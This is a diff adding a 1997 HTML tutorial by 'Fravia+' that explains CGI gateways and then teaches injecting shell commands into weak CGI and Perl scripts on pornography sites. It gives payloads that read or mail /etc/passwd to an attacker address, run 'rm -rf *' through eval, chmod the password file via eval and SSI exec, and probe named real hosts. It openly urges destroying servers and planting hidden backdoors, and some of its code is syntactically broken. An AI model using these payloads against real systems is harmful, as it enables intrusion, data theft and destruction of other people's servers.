@@ -1,0 +1,334 @@
+<HTML>
+<HEAD>
+<TITLE>ideale3</TITLE>
+</HEAD>
+<BODY BGCOLOR=#C0C0C0 TEXT=#001010 VLINK=#405040>
+<A NAME="anchortop"></A>
+<!-- Begin Introdo -->
+<center>
+<BR>
+<Font color=gray>Crackers against Smut</fonT>
+
+</center>
+<H1>
+<Font size=+5>
+<CENTER>Fravia's <Font color=red>CGI-script reversing</Font><br>page ONE</font></CENTER></H1>
+<CENTER>
+<B>(CGI-script reverse engineering)</B><br>
+~<br>
+<B>(How to exploit weak CGI-script and PERL programs used by the Smut dealers)</B><br>
+(How to nuke a page against the will of its owner)<br>
+<br>~<br>
+By Fravia+, Updated <font color=red>27 November 1997</fonT><br>Page severely under construction... 
+SEND MORE CONTRIBUTIONS!
+</CENTER><br><hr size=2>
+<!-- Begin whatwewant -->
+<i>
+What is CGI-script reverse engineering?<br>
+Well, if we want to crack the smut dealers, we must first understand a little 
+how their gateways 
+work... so first of all  you must understand what are gateways... in fact there 
+is quite a lot you should understand before waging this battle... let's begin!
+<br>
+Remember that you can use gateways running on Internet, install gateways that 
+have been developed by others or develop your own.
+<br>
+The CGI is the mechanism for communicating between your gateway and your Web 
+server.<br>
+Let's be clear on this: When the user enters text on a form, or in response 
+to an ISINDEX query, and hits the return key, the Web browser sends keystrokes 
+captured from the user to the httpd server.<br>
+When an HTML document contains an ISINDEX tag, the browser displays an input box with the phrase:<br></i><pre>
+This is a searchable index. Enter search keywords: type-input-here</pre><i>
+Here you have an example of it:<ISINDEX><br>
+This does NOT mean that your HTML document is automatically a searchable index. The 
+ISINDEX tag just captures user keystrokes and sends those keystrokes to a gateway using 
+the GET method. The GATEWAY performs the actual search. If the gateway does not exist, 
+placing the ISINDEX tag in the HTML document will not make it exist, altough it will 
+look to the user as though it exists. The user can certainly key in a search string. 
+But when the return key is hit, no search will occur. Try it on the ISINDEX window above.Now.<br> 
+Nothing happens: to have your Web server 
+perform search functions you must develop or set up a gateway to perform the search. 
+<br>
+The htppd server accepts the input, which will come through a FORM or an ISINDEX tag, 
+starts up the gateway 
+and hands the input to the gateway via the CGI.<br>
+The user's keystrokes are passed to the gateway either via environment variables 
+(called the GET method) or using standard input (called the POST method). The 
+gateway then passes the input and process it. It may generate HTML output, which 
+is returned to the httpd server to pass to the client, or it may save data in a 
+file or database or send email to someone.<br>
+<br>
+The gateway itself can be a script or program, written in C/C++, Perl, tcl, 
+the C Shell or the Bourne Shell. Each language has its own strengths as a 
+gateway language.<br>
+<br>
+CGI gateways that generate HTML output are required to preface the HTML output 
+to stdout with the following line:<br><pre>
+Content-type: text/html</pre>
+This line must be followed by a blank line before the first &lt;HTML&gt; tag is sent.<br>
+<br>
+The gateway does not have to generate HTML. It could return the URL of another file, 
+indicating to the browser that it should get that file. This is called <u>URL 
+redirection</u>. In fact this is the most commonly used method that the 
+commercial smut-dealers 
+use to pass some specific images to the user<br>
+CGI gateways using URL redirection write the following line to 
+stdout:< br></i><pre>
+Location: URL</pre><i>
+This line, too, must be followed by a blank line before the stdout data stream 
+terminates.<br>
+<br>
+Passing parameters to CGI scripts by appending them to the URL is referred to as 
+the GET method. 
+CGI scripts written to use the GET method must explicitly read the QUERY_STRING 
+variable to get and then parse the query. The GET method is usually used to invoke 
+a simple CGI script with a single parameter.<br>
+<br>
+For example, to pass your name (Fravia of TheHCU) to the test-cgi gateway, located 
+in cgi-bin, you would open the following URL:<br><pre>
+http://hostname/cgi-bin/test-cgi?Fravia+of+TheHCU</pre>
+The incoming parameter is appended to the base URL after the ? character, with 
+blanks replaced by the + character. The parameter is set as an environment variable 
+called QUERY_STRING, but is not passed to test-cgi as a command line option, or in 
+standard input. The HTML output returned from this URL would be (since test-cgi 
+describes how the httpd server is configured and what information is being passed 
+generically to all CGI scripts, more or less the following:<br></i><pre>
+CGI/1.0 test script report:
+
+argc is 3. Argv is Fravia of TheHCU
+
+SERVER_SOFTWARE = NCSA/1.3
+SERVER_NAME = hostname
+GATEWAY_INTERFACE = CGI/1.1
+SERVER_PROTOCOL = HTTP/1.0
+SERVER_PORT = 80
+REQUEST_METHOD = GET
+HTTP_ACCEPT = text/plain, application/x-html, application/html,
+text/x-html, text/html, image/*, application/postscript, video/mpeg,
+audio/basic, audio/x-aiff, image/gif, image/Jpeg, image/tiff,
+...
+...
+text/richtext, text/tab-separated-values, text/x-setext, */*
+PATH_INFO =
+PATH_TRANSLATED =
+SCRIPT_NAME = /cgi-bin/test-cgi
+QUERY_STRING = Fravia+of+TheHCU
+REMOTE_HOST = xxx.xxx.xxx
+REMOTE_ADDR = xxx.xxx.xxx.xxx
+REMOTE_USER =
+AUTH_TYPE =
+CONTENT_TYPE =
+CONTENT_LENGTH =</pre><i>
+All of the capitalized variable names (like SERVER_NAME) are environment 
+variables that are set by the CGI. These are available to be used by your 
+gateway. As you have seen, parameters can be passed to a gateway by appending 
+them to the URL using the following scheme:<br></i><pre>
+URL?first+second+third</pre><i>
+<br>
+That was it for the GET method. 
+<br>Alternatively, parameters can be passed to CGI 
+scripts using standard input, this is called the POST method. It is used when 
+there is a large amount of information that would be awqward to append to the 
+end of the URL (as with the GET method) or when the parameters need to be encoded. 
+Most of the advanced work on secure transactions on the net is focused on secure 
+encoding techniques for the POST method.<br>
+<br>
+When using the POST method, two parameters, for a user's name and email 
+address, might look like:<br></i><pre>
+NAME=Fravia+of+TheHCU&EMAIL=msre@chez.com</pre><i>
+The CGI script would then parse the two parameters as:<br></i><pre>
+NAME		Fravia of TheHCU
+EMAIL		msre@chez.com</pre><i>
+The & character separates the parameter pairs and the = character separates each 
+parameter name from his value. The + character is used again as a substitute for 
+blanks. The Perl CGI library contains code to parse standard input to load an 
+associative array for processing.<br>
+<br>
+If the CGI-scripts are not carefully written the server can have problems: anytime 
+it captures user keystrokes, those keystroke could be malicious. Attacking a Web 
+server usually consist in embedding shell metacharacters inside our input, seeking 
+the execution of 
+arbitrary commands on the system that runs the gateway, a danger particularly common, 
+with older CGI gateways written in the Bourne or C Shell, in Perl or in any language 
+where an interpreter can execute commands external to the gateway.<br>
+<br>
+Rather than trapping "problem" metacharacters, the CGI scripts use simply 
+a regular expression to check for legal keystrokes:<br></i><pre>
+[a-zA-Z0-9_-+ \t\/@%]</pre><i>(There is a blank space after the + sign)<br>
+<br>
+<font color=red>Now starts the really interesting part :-)</fonT><br>
+The "newline" char is often allowed (%0a), and you can use it to execute commands 
+that are DIFFERENT from the commands that the script awaits, you can therefore add 
+a field to a URL to execute functions that are outside the script, for example the 
+following URL asks from the server a copy of /etc/passwd:<br><pre>
+http://www.odci.gov/cgi-bin/query?%0a/bin/cat%20/etc/passwd</pre>
+The characters ASCII "0a" and "20" are respectively a newline and a space.<br>
+<br></i><Font size=+2>Form processing</Font><br>
+Forms are a natural progression from simple queries and are officially part of HTML 
+version 3.0.<br>
+Here you have an example:<br><hr size=2><Font color=purple>
+<EM>Please send us your comments!</EM>
+<P>
+<HR size=1 width=33%>
+<P>
+<FORM METHOD="POST" ACTION="/cgi-bin/comments">
+Name: <Input TEXT NAME="feedback_name" size=36><br>
+Email: <Input TEXT NAME="feedback_email" size=36><br>
+<P>
+<TEXTAREA NAME="feedback_comments" ROWS=4 COLS=30>
+</TEXTAREA>
+<P>
+<INPUT TYPE="submit" VALUE="Send Comments">
+<INPUT TYPE="reset" VALUE="Clear Form">
+</FORM></Font>
+<hr size=2>
+<br>
+<i>
+Each INPUT tag has a variable name associated. The CGI scripts filter the contents 
+of the field INPUT, if they don't you have a similar situation ro the previous one, 
+and your data are directly passed to the interpreter.<br><br>
+Another used HTML tag is the SELECT tag, that allows to the user on the client 
+machine to select between a number of options. This selection gives also a value 
+to a specified variable.<br>
+The CGI-scripts usually DO NOT check this value, assuming that there is only a 
+predefined number of choices, and these values go directly to the interpreter 
+for interpreted languages.<br>
+A typical sendmail attack is made using the characters "~!", on vulnerable systems.<br>
+If there is a CGI-script with a call to the UNIX system with only ONE argument, 
+you can attack that system, because the system in that case forks a shell in order
+ to allow the request, for instance the following PERL script:<br></i><pre>
+system("/usr/bin/sendmail -t %s &lt; %s", $address_to_email &lt; $file_entered</pre><i>
+has been designed to email a copy of file_entered to the email address 
+address_to_email. Since the script calls system with only one argument, 
+this program runs a separated shell, apt to be forked.<br>
+Now copy and MODIFY the same data:<br></i>
+<pre>
+&lt;INPUT TYPE="HIDDEN" NAME="address_to_email" VALUE="address@server.com;mail cracker@his.address &lt;/etc/passwd"&gt;
+</pre>
+<i>
+You get it? In this way you can get the file /etc/passwd of that server<br>
+<br>
+The function system() is not the only command to fork a new shell. 
+The function exec(), with only one argument allows the same attacks. 
+Opening a file and piping its result opens also a separate shell. 
+In PERL the function :<br></i><pre>
+open(FILE, "| program_name $ARGS")</pre><i>
+opens a FILE and pipes its contents with program_name, which will be executed as 
+separated shell.<br>
+<br>
+The PERL command "eval" executes any argument you pass. The CGI-script that pass 
+user data to the command 
+eval can be used to execute ANYTHING that the user wishes, on the 
+smut dealers sites I would suggest, first to check if the "" passed to 
+the interpreter are accepted<br></i><pre>
+$_ = $VALUE; s/"/\\" /g		$RESULT = eval qq/"$_"/;</pre><i><br>
+And then <Font color=red>destroy</Font> the smut dealer server with VALUE 
+containing<br></i><pre>
+"rm -rf *"</pre><i>
+<br>
+CGI-script are READABLE, and you can copy them, modify them or substitute them.<bR>
+PERL scripts containing include lines like the following:<br></i><pre>
+require "cgi-lib"</pre><i>
+Include the cgi-lib library. If the file permissions are not correct, 
+the script IS vulnerable! You may want to verify the permission adding to the 
+URL of a cgi-script (using the method GET) following characters:<br></i><pre>
+"%0a/bin/ls%20-la%20/usr/src/include</pre><i><br>
+If you copy, modify and substitute the library, you will be able to execute 
+commands or routines from inside the library file.<br>
+<br>
+The PERL interpreter dwells mostly in usr/bin. If it has been run as SETSUID 
+root, you may modify the file permissions with a direct command to the system:<br></i><pre>
+$_ = "chmod 666\/etc\/passwd" $RESULT = eval qq/"$_"/;</pre><i><br>
+And now the passwd file can be accessed by everybody.<br>
+<br>
+Finally there is an extension that some http server allow: the SSI (Server Side 
+Include). Most SSI have been disabled, but there are still many out there. 
+The syntax is:<br></i><pre>
+!-- #command variable="value" --</pre><i><br>
+If the script does not filter the input, you may write:<br></i><pre>
+!-- #exec cmd="chmod 666 /etc/passwd" --</pre><i>
+"exec cmd" then runs a shell and executes the command you wrote between "", in 
+this case chmod. Obviously as soon as you gain etc/passwd you can lame the site 
+of the Smut dealer, or even better, 'seed' therein hundred concealed 'entrances' 
+for later eaiser busting :-)<br><br>
+<Font size=+2>Where are located the CGI-scripts?</Font><br>
+CGI scripts can be placed in THREE locations, the main cgi-bin subdirectory, 
+alternative, cgi-bin subdirectories (that have been established with the 
+ScriptAlias directive) AND in users' personal HTML subdirectories.<br>
+Web server administrators police very seldom all these areas, mostly (if 
+they do it) they limit themselves to check that the Options directive, used to 
+protect users' personal HTML directories is not set to All or ExecCGI.<br>
+On the other hand, if they don't trust a SPECIFIC user, they usually specify 
+the Options directive in access.conf to be used server-wide and then use<br><pre>
+AllowOverride None</pre>
+Here are, courtesy of +gthorne, some nice 'starter' tricks you may want to 
+use to UNDERSTAND how all this work and how frequently Web servers allow 
+you more access than it you would believe (PLEASE, do not destroy yet 
+vrysex.com, I need it alive for teaching purposes):<br><pre>
+http://www.vrysex.com/cgi-bin/nph-test-cgi?*<br></pre>
+(This gives information even if not available :-)<br><pre>
+http://www.vrysex.com/cgi-bin/test-cgi?*
+http://www.vrysex.com/cgi-bin/nph-test-cgi?/*
+http://www.vrysex.com/cgi-bin/nph-test-cgi?etc/*<br></pre>
+Remeber also that the standard Web account (the default user ID) 
+is called<br><pre>
+Username: nobody<br></pre>
+This isn't root, of course, but it gives nevertheless access to all that
+ an user can if he has an account on the system (otherwise web pages 
+wouldn't work at all. BTW, the dafault Group is -1
+<br><br>
+<Font size=+2>Defaults of a standalone daemon</Font><br>
+<Font size=+1>(know what you should be looking for on the smut sites)</Font><br>
+<br>
+<Font color=blue>httpd.conf</Font> = Main server configuration file<br>
+<i>This controls HOW the server runs, not details relating to the files it serves</i><br>
+<Font color=blue>srm.conf</Font>	= Server resource configuration file<br>
+<i>
+DocumentRoot directive, points per default to /usr/local/etc/httpd/htdocs
+<br>
+UserDir = public_html per default! If the seradm forgot to set it to DISABLED, 
+users could serve files from their home directories!<br>
+If the cgi-bin directory is not at default location /usr/local/etc/httpd/cgi-bin/, its new location can 
+be found inside the Alias or ScriptAlias directives!<br>
+AccessFileName = .htaccess<br>
+DocumentRoot = /usr/local/etc/httpd/htdocs<br>
+
+</i>
+<br>
+<Font color=blue>access.conf</Font> = Global access control file (ACF)<br>
+<br>
+Default User ID (UID) =	nobody<br>
+Default User Group (UIG) = -1<br>
+Recommended UID = http<br>
+Reccomended UIG = WWW<br>
+<i>(These names must exist in /etc/passwd and etc/group respectively)</i><br>
+ServerAdmin =	webmaster@local.domain<br>
+ServerRoot = /usr/local/etc/passwd<br>
+ServerName = www.local.domain (or a CNAME alias)<br>
+ServerType = standalone<br>
+
+
+<br><hr size=2 width=55%>
+<Font size=+2>A first Conclusion</Font><br>
+The incorrect use of the CGI scripts implies many vulnerabilities for the 
+system hosting them.<br>
+Most smut dealer have little or no knowledge of programming but NEED always 
+some sort of script to give the authorised suckers their smut and leave out 
+everybody else... mostly they will have set their scripts on the quick way, 
+using often incapable programmers... a world of possibilities for us!
+</i><br><br>
+
+
+
+
+<br><center>
+<br></Font>
+
+<Font size=+3>
+Good luck, good hunt!<br></Font>
+</center>
+
+
+</body>
+</html>
